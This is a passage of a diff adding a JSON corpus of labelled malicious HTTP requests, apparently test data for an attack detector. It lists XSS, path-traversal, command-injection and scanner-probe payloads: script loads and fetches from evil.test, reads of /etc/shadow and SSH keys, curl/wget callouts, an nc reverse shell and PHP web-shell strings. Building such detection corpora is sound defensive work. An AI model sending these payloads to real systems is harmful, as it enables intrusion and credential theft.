+      "note": "attribute break"
+    },
+    {
+      "id": "a033",
+      "category": "xss",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "img onerror"
+    },
+    {
+      "id": "a034",
+      "category": "xss",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=%3Csvg%20onload%3Dalert(1)%3E",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "svg onload"
+    },
+    {
+      "id": "a035",
+      "category": "xss",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=javascript%3Aalert(1)",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "javascript uri"
+    },
+    {
+      "id": "a036",
+      "category": "xss",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=%3Ciframe%20src%3D%2F%2Fevil.test%3E%3C%2Fiframe%3E",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "iframe"
+    },
+    {
+      "id": "a037",
+      "category": "xss",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=%3Cbody%20onload%3Dalert(1)%3E",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "body onload"
+    },
+    {
+      "id": "a038",
+      "category": "xss",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=%3Cimage%20src%3Dx%20onerror%3Dalert(1)%3E",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "image onerror"
+    },
+    {
+      "id": "a039",
+      "category": "xss",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=%3Ca%20href%3D%22javascript%3Aalert(1)%22%3Eclick%3C%2Fa%3E",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "anchor javascript"
+    },
+    {
+      "id": "a040",
+      "category": "xss",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=%3Cdetails%20ontoggle%3Dalert(1)%3E",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "details ontoggle"
+    },
+    {
+      "id": "a041",
+      "category": "xss",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=%3Cinput%20onfocus%3Dalert(1)%20autofocus%3E",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "input onfocus"
+    },
+    {
+      "id": "a042",
+      "category": "xss",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=%3Cform%20onsubmit%3Dalert(1)%3E",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "form onsubmit"
+    },
+    {
+      "id": "a043",
+      "category": "xss",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=%3Cdiv%20onmouseover%3Dalert(1)%3Ehover%3C%2Fdiv%3E",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "div onmouseover"
+    },
+    {
+      "id": "a044",
+      "category": "xss",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=%3Csvg%3E%3Canimate%20onbegin%3Dalert(1)%3E",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "svg animate"
+    },
+    {
+      "id": "a045",
+      "category": "xss",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=%3CSCRIPT%3Ealert(1)%3C%2FSCRIPT%3E",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "uppercase script"
+    },
+    {
+      "id": "a046",
+      "category": "xss",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=%3CScRiPt%3Ealert(1)%3C%2FsCrIpT%3E",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "mixed case script"
+    },
+    {
+      "id": "a047",
+      "category": "xss",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=%3Csvg%2Fonload%3Dalert(1)%3E",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "svg slash"
+    },
+    {
+      "id": "a048",
+      "category": "xss",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=%3Cvml%3Aoval%3E%3C%2Fvml%3Aoval%3E",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "vml"
+    },
+    {
+      "id": "a049",
+      "category": "xss",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=%3Cmarquee%20onstart%3Dalert(1)%3E",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "marquee onstart"
+    },
+    {
+      "id": "a050",
+      "category": "xss",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=%3Cobject%20data%3Djavascript%3Aalert(1)%3E",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "object javascript"
+    },
+    {
+      "id": "a051",
+      "category": "xss",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=%3Cembed%20src%3Djavascript%3Aalert(1)%3E",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "embed javascript"
+    },
+    {
+      "id": "a052",
+      "category": "xss",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=%3Cscript%20src%3D%2F%2Fevil.test%2Fx.js%3E%3C%2Fscript%3E",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "external script"
+    },
+    {
+      "id": "a053",
+      "category": "xss",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=%3Ciframe%20srcdoc%3D%22%3Cscript%3Ealert(1)%3C%2Fscript%3E%22%3E",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "srcdoc"
+    },
+    {
+      "id": "a054",
+      "category": "xss",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=%3Cimg%20src%3D%22x%22%20onerror%3D%22alert(1)%22%3E",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "quoted onerror"
+    },
+    {
+      "id": "a055",
+      "category": "xss",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=JAVASCRIPT%3Aalert(1)",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "uppercase javascript"
+    },
+    {
+      "id": "a056",
+      "category": "xss",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=%3Csvg%20onbegin%3Dalert(1)%3E",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "svg onbegin"
+    },
+    {
+      "id": "a057",
+      "category": "xss",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=%3Cvideo%3E%3Csource%20onerror%3Dalert(1)%3E",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "video source onerror"
+    },
+    {
+      "id": "a058",
+      "category": "xss",
+      "method": "POST",
+      "path": "/comment",
+      "query": "",
+      "body": "comment=%3Cscript%3Efetch(%27%2F%2Fevil.test%27)%3C%2Fscript%3E&rating=1",
+      "content_type": "application/x-www-form-urlencoded",
+      "headers": {},
+      "note": "form script"
+    },
+    {
+      "id": "a059",
+      "category": "xss",
+      "method": "POST",
+      "path": "/api/comment",
+      "query": "",
+      "body": "{\"comment\": \"<script>alert(1)</script>\"}",
+      "content_type": "application/json",
+      "headers": {},
+      "note": "json script"
+    },
+    {
+      "id": "a060",
+      "category": "xss",
+      "method": "POST",
+      "path": "/api/comment",
+      "query": "",
+      "body": "{\"comment\": \"<img src=x onerror=alert(1)>\"}",
+      "content_type": "application/json",
+      "headers": {},
+      "note": "json onerror"
+    },
+    {
+      "id": "a061",
+      "category": "traversal",
+      "method": "GET",
+      "path": "/download",
+      "query": "file=../../../../etc/passwd",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "dotdot"
+    },
+    {
+      "id": "a062",
+      "category": "traversal",
+      "method": "GET",
+      "path": "/download",
+      "query": "file=..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "encoded slash"
+    },
+    {
+      "id": "a063",
+      "category": "traversal",
+      "method": "GET",
+      "path": "/download",
+      "query": "file=%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "encoded dots"
+    },
+    {
+      "id": "a064",
+      "category": "traversal",
+      "method": "GET",
+      "path": "/download",
+      "query": "file=%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "double encoded"
+    },
+    {
+      "id": "a065",
+      "category": "traversal",
+      "method": "GET",
+      "path": "/static/../../etc/passwd",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "path traversal"
+    },
+    {
+      "id": "a066",
+      "category": "traversal",
+      "method": "GET",
+      "path": "/assets/..%2F..%2Fconfig.json",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "encoded in path"
+    },
+    {
+      "id": "a067",
+      "category": "traversal",
+      "method": "GET",
+      "path": "/download",
+      "query": "file=..%5C..%5Cwindows%5Cwin.ini",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "backslash"
+    },
+    {
+      "id": "a068",
+      "category": "traversal",
+      "method": "GET",
+      "path": "/download",
+      "query": "file=C%3A%5Cboot.ini",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "boot ini"
+    },
+    {
+      "id": "a069",
+      "category": "traversal",
+      "method": "GET",
+      "path": "/download",
+      "query": "file=/etc/shadow",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "shadow file"
+    },
+    {
+      "id": "a070",
+      "category": "traversal",
+      "method": "GET",
+      "path": "/download",
+      "query": "file=/etc/passwd%00.jpg",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "null byte"
+    },
+    {
+      "id": "a071",
+      "category": "traversal",
+      "method": "GET",
+      "path": "/download",
+      "query": "file=....//....//etc/passwd",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "nested dotdot"
+    },
+    {
+      "id": "a072",
+      "category": "traversal",
+      "method": "GET",
+      "path": "/download",
+      "query": "file=..;/..;/etc/passwd",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "semicolon"
+    },
+    {
+      "id": "a073",
+      "category": "traversal",
+      "method": "GET",
+      "path": "/download",
+      "query": "file=../../../../proc/self/environ",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "proc environ"
+    },
+    {
+      "id": "a074",
+      "category": "traversal",
+      "method": "GET",
+      "path": "/download",
+      "query": "file=%2e%2e%5c%2e%2e%5cwin.ini",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "encoded backslash"
+    },
+    {
+      "id": "a075",
+      "category": "traversal",
+      "method": "GET",
+      "path": "/download",
+      "query": "file=../../../var/log/auth.log",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "log file"
+    },
+    {
+      "id": "a076",
+      "category": "traversal",
+      "method": "GET",
+      "path": "/download",
+      "query": "file=../../.env",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "env traversal"
+    },
+    {
+      "id": "a077",
+      "category": "traversal",
+      "method": "GET",
+      "path": "/download",
+      "query": "file=..%2f..%2f..%2fetc%2fhosts",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "etc hosts"
+    },
+    {
+      "id": "a078",
+      "category": "traversal",
+      "method": "GET",
+      "path": "/download",
+      "query": "file=../../../../root/.ssh/id_rsa",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "ssh key"
+    },
+    {
+      "id": "a079",
+      "category": "traversal",
+      "method": "GET",
+      "path": "/download",
+      "query": "file=../../boot.ini",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "boot ini plain"
+    },
+    {
+      "id": "a080",
+      "category": "traversal",
+      "method": "GET",
+      "path": "/download",
+      "query": "file=..\\..\\..\\windows\\win.ini",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "windows win.ini"
+    },
+    {
+      "id": "a081",
+      "category": "traversal",
+      "method": "GET",
+      "path": "/download",
+      "query": "file=%2e%2e/%2e%2e/etc/passwd",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "mixed encoding"
+    },
+    {
+      "id": "a082",
+      "category": "traversal",
+      "method": "GET",
+      "path": "/download",
+      "query": "file=..%c0%af..%c0%afetc%c0%afpasswd",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "overlong utf8"
+    },
+    {
+      "id": "a083",
+      "category": "traversal",
+      "method": "GET",
+      "path": "/download",
+      "query": "file=..%252f..%252fetc%252fpasswd",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "double slash"
+    },
+    {
+      "id": "a084",
+      "category": "traversal",
+      "method": "GET",
+      "path": "/download",
+      "query": "file=/etc/passwd%2500.jpg",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "double null"
+    },
+    {
+      "id": "a085",
+      "category": "traversal",
+      "method": "GET",
+      "path": "/download",
+      "query": "file=../../../../../../etc/passwd%00",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "null at end"
+    },
+    {
+      "id": "a086",
+      "category": "traversal",
+      "method": "GET",
+      "path": "/download",
+      "query": "file=..%5c..%5c..%5cboot.ini",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "backslash boot"
+    },
+    {
+      "id": "a087",
+      "category": "traversal",
+      "method": "GET",
+      "path": "/download",
+      "query": "file=../../etc/passwd%09",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "tab suffix"
+    },
+    {
+      "id": "a088",
+      "category": "traversal",
+      "method": "GET",
+      "path": "/download",
+      "query": "file=%2e%2e%2f%2e%2e%2fwindows%2fwin.ini",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "encoded windows"
+    },
+    {
+      "id": "a089",
+      "category": "traversal",
+      "method": "GET",
+      "path": "/download",
+      "query": "file=../../../etc/shadow",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "etc shadow"
+    },
+    {
+      "id": "a090",
+      "category": "traversal",
+      "method": "GET",
+      "path": "/download",
+      "query": "file=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "deep encoded"
+    },
+    {
+      "id": "a091",
+      "category": "rce",
+      "method": "GET",
+      "path": "/ping",
+      "query": "host=127.0.0.1%3Bcat%20%2Fetc%2Fpasswd",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "semicolon cat"
+    },
+    {
+      "id": "a092",
+      "category": "rce",
+      "method": "GET",
+      "path": "/ping",
+      "query": "host=127.0.0.1%7Cwhoami",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "pipe whoami"
+    },
+    {
+      "id": "a093",
+      "category": "rce",
+      "method": "GET",
+      "path": "/ping",
+      "query": "host=127.0.0.1%20%26%26%20id",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "and id"
+    },
+    {
+      "id": "a094",
+      "category": "rce",
+      "method": "GET",
+      "path": "/ping",
+      "query": "host=%60id%60",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "backtick id"
+    },
+    {
+      "id": "a095",
+      "category": "rce",
+      "method": "GET",
+      "path": "/ping",
+      "query": "host=%24(whoami)",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "subshell whoami"
+    },
+    {
+      "id": "a096",
+      "category": "rce",
+      "method": "GET",
+      "path": "/ping",
+      "query": "host=%24(curl%20http%3A%2F%2Fevil.test%2Fx)",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "curl exfil"
+    },
+    {
+      "id": "a097",
+      "category": "rce",
+      "method": "GET",
+      "path": "/ping",
+      "query": "host=127.0.0.1%3Bwget%20http%3A%2F%2Fevil.test%2Fx",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "wget"
+    },
+    {
+      "id": "a098",
+      "category": "rce",
+      "method": "GET",
+      "path": "/ping",
+      "query": "host=127.0.0.1%3B%2Fbin%2Fbash%20-c%20id",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "bash path"
+    },
+    {
+      "id": "a099",
+      "category": "rce",
+      "method": "GET",
+      "path": "/ping",
+      "query": "host=127.0.0.1%3Bsh%20-c%20id",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "sh path"
+    },
+    {
+      "id": "a100",
+      "category": "rce",
+      "method": "GET",
+      "path": "/ping",
+      "query": "host=127.0.0.1%3Bpython%20-c%20print(1)",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "python"
+    },
+    {
+      "id": "a101",
+      "category": "rce",
+      "method": "GET",
+      "path": "/ping",
+      "query": "host=127.0.0.1%3Bperl%20-e%20print(1)",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "perl"
+    },
+    {
+      "id": "a102",
+      "category": "rce",
+      "method": "GET",
+      "path": "/ping",
+      "query": "host=127.0.0.1%3Bnc%20-e%20%2Fbin%2Fsh%20127.0.0.1%204444",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "netcat"
+    },
+    {
+      "id": "a103",
+      "category": "rce",
+      "method": "GET",
+      "path": "/upload",
+      "query": "name=shell.php",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "php upload name"
+    },
+    {
+      "id": "a104",
+      "category": "rce",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=phpinfo()",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "phpinfo"
+    },
+    {
+      "id": "a105",
+      "category": "rce",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=java.lang.Runtime.getRuntime().exec('id')",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "java runtime"
+    },
+    {
+      "id": "a106",
+      "category": "rce",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=Class.forName('java.lang.Runtime')",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "class forname"
+    },
+    {
+      "id": "a107",
+      "category": "rce",
+      "method": "GET",
+      "path": "/search",
+      "query": "q=ProcessBuilder('/bin/sh')",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "process builder"
+    },
+    {
+      "id": "a108",
+      "category": "rce",
+      "method": "GET",
+      "path": "/ping",
+      "query": "host=127.0.0.1%3Bcmd.exe%20%2Fc%20dir",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "cmd exe"
+    },
+    {
+      "id": "a109",
+      "category": "rce",
+      "method": "GET",
+      "path": "/ping",
+      "query": "host=127.0.0.1%3Bpowershell%20-enc%20AAA",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "powershell"
+    },
+    {
+      "id": "a110",
+      "category": "rce",
+      "method": "GET",
+      "path": "/ping",
+      "query": "host=127.0.0.1%3B%2Fbin%2Fsh",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "bin sh"
+    },
+    {
+      "id": "a111",
+      "category": "rce",
+      "method": "GET",
+      "path": "/ping",
+      "query": "host=1%3B%20cat%20%2Fetc%2Fshadow",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "shadow read"
+    },
+    {
+      "id": "a112",
+      "category": "rce",
+      "method": "GET",
+      "path": "/ping",
+      "query": "host=1%7C%7Ccurl%20http%3A%2F%2Fevil.test",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "or curl"
+    },
+    {
+      "id": "a113",
+      "category": "rce",
+      "method": "GET",
+      "path": "/ping",
+      "query": "host=1%3B%24(id)",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "dollar subshell"
+    },
+    {
+      "id": "a114",
+      "category": "rce",
+      "method": "GET",
+      "path": "/ping",
+      "query": "host=1%3Bbash%20-i",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "interactive bash"
+    },
+    {
+      "id": "a115",
+      "category": "rce",
+      "method": "POST",
+      "path": "/comment",
+      "query": "",
+      "body": "comment=%3C%3Fphp%20system(%24_GET%5B%27c%27%5D)%3B%20%3F%3E",
+      "content_type": "application/x-www-form-urlencoded",
+      "headers": {},
+      "note": "php payload"
+    },
+    {
+      "id": "a116",
+      "category": "rce",
+      "method": "POST",
+      "path": "/api/exec",
+      "query": "",
+      "body": "{\"cmd\": \"cat /etc/passwd\"}",
+      "content_type": "application/json",
+      "headers": {},
+      "note": "json cat"
+    },
+    {
+      "id": "a117",
+      "category": "rce",
+      "method": "POST",
+      "path": "/api/exec",
+      "query": "",
+      "body": "{\"cmd\": \"$(id)\"}",
+      "content_type": "application/json",
+      "headers": {},
+      "note": "json subshell"
+    },
+    {
+      "id": "a118",
+      "category": "rce",
+      "method": "POST",
+      "path": "/api/exec",
+      "query": "",
+      "body": "{\"cmd\": \"|whoami\"}",
+      "content_type": "application/json",
+      "headers": {},
+      "note": "json pipe"
+    },
+    {
+      "id": "a119",
+      "category": "rce",
+      "method": "POST",
+      "path": "/api/exec",
+      "query": "",
+      "body": "{\"cmd\": \"`curl http://evil.test`\"}",
+      "content_type": "application/json",
+      "headers": {},
+      "note": "json backtick"
+    },
+    {
+      "id": "a120",
+      "category": "rce",
+      "method": "POST",
+      "path": "/api/exec",
+      "query": "",
+      "body": "{\"code\": \"<?php system($_GET['c']); ?>\"}",
+      "content_type": "application/json",
+      "headers": {},
+      "note": "json php"
+    },
+    {
+      "id": "a121",
+      "category": "scanner",
+      "method": "GET",
+      "path": "/",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "sqlmap/1.8.7#stable"
+      },
+      "note": "scanner user agent"
+    },
+    {
+      "id": "a122",
+      "category": "scanner",
+      "method": "GET",
+      "path": "/",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "sqlmap/1.8.7#stable"
+      },
+      "note": "scanner user agent"
+    },
+    {
+      "id": "a123",
+      "category": "scanner",
+      "method": "GET",
+      "path": "/",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "sqlmap/1.8.7#stable"
+      },
+      "note": "scanner user agent"
+    },
+    {
+      "id": "a124",
+      "category": "scanner",
+      "method": "GET",
+      "path": "/",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Nikto/2.5.0"
+      },
+      "note": "scanner user agent"
+    },
+    {
+      "id": "a125",
+      "category": "scanner",
+      "method": "GET",
+      "path": "/",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Nikto/2.5.0"
+      },
+      "note": "scanner user agent"
+    },
+    {
+      "id": "a126",
+      "category": "scanner",
+      "method": "GET",
+      "path": "/",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Nikto/2.5.0"
+      },
+      "note": "scanner user agent"
+    },
+    {
+      "id": "a127",
+      "category": "scanner",
+      "method": "GET",
+      "path": "/",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (compatible; Nuclei)"
+      },
+      "note": "scanner user agent"
+    },
+    {
+      "id": "a128",
+      "category": "scanner",
+      "method": "GET",
+      "path": "/",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (compatible; Nuclei)"
+      },
+      "note": "scanner user agent"
+    },
+    {
+      "id": "a129",
+      "category": "scanner",
+      "method": "GET",
+      "path": "/",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (compatible; Nuclei)"
+      },
+      "note": "scanner user agent"
+    },
+    {
+      "id": "a130",
+      "category": "scanner",
+      "method": "GET",
+      "path": "/",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "zgrab/0.x"
+      },
+      "note": "scanner user agent"
+    },
+    {
+      "id": "a131",
+      "category": "scanner",
+      "method": "GET",
+      "path": "/",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "zgrab/0.x"
+      },
+      "note": "scanner user agent"
+    },
+    {
+      "id": "a132",
+      "category": "scanner",
+      "method": "GET",
+      "path": "/",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "zgrab/0.x"
+      },
+      "note": "scanner user agent"
+    },
+    {
+      "id": "a133",
+      "category": "scanner",
+      "method": "GET",
+      "path": "/",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "masscan/1.3"
+      },
+      "note": "scanner user agent"
+    },
+    {
+      "id": "a134",
+      "category": "scanner",
+      "method": "GET",
+      "path": "/",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "masscan/1.3"
+      },
+      "note": "scanner user agent"
+    },
+    {
+      "id": "a135",
+      "category": "scanner",
+      "method": "GET",
+      "path": "/",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "masscan/1.3"
+      },
+      "note": "scanner user agent"
+    },
+    {
+      "id": "a136",
+      "category": "scanner",
+      "method": "GET",
+      "path": "/",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "acunetix/14"
+      },
+      "note": "scanner user agent"
+    },
+    {
+      "id": "a137",
+      "category": "scanner",
+      "method": "GET",
+      "path": "/",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "acunetix/14"
+      },
+      "note": "scanner user agent"
+    },
+    {
+      "id": "a138",
+      "category": "scanner",
+      "method": "GET",
+      "path": "/",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {
+        "User-Agent": "acunetix/14"
+      },
+      "note": "scanner user agent"
+    },
+    {
+      "id": "a139",
+      "category": "scanner",
+      "method": "GET",
+      "path": "/.git/config",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "git config"
+    },
+    {
+      "id": "a140",
+      "category": "scanner",
+      "method": "GET",
+      "path": "/.git/HEAD",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "git head"
+    },
+    {
+      "id": "a141",
+      "category": "scanner",
+      "method": "GET",
+      "path": "/.svn/entries",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "svn entries"
+    },
+    {
+      "id": "a142",
+      "category": "scanner",
+      "method": "GET",
+      "path": "/.env",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "env file"
+    },
+    {
+      "id": "a143",
+      "category": "scanner",
+      "method": "GET",
+      "path": "/.env.local",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "env local"
+    },
+    {
+      "id": "a144",
+      "category": "scanner",
+      "method": "GET",
+      "path": "/wp-admin/",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "wordpress admin"
+    },
+    {
+      "id": "a145",
+      "category": "scanner",
+      "method": "GET",
+      "path": "/wp-login.php",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "wordpress login"
+    },
+    {
+      "id": "a146",
+      "category": "scanner",
+      "method": "GET",
+      "path": "/phpmyadmin/index.php",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "phpmyadmin"
+    },
+    {
+      "id": "a147",
+      "category": "scanner",
+      "method": "GET",
+      "path": "/server-status",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "server status"
+    },
+    {
+      "id": "a148",
+      "category": "scanner",
+      "method": "GET",
+      "path": "/.aws/credentials",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "aws credentials"
+    },
+    {
+      "id": "a149",
+      "category": "scanner",
+      "method": "GET",
+      "path": "/.ssh/id_rsa",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "ssh key"
+    },
+    {
+      "id": "a150",
+      "category": "scanner",
+      "method": "GET",
+      "path": "/actuator/env",
+      "query": "",
+      "body": "",
+      "content_type": "",
+      "headers": {},
+      "note": "actuator env"
+    }
+  ]
+}
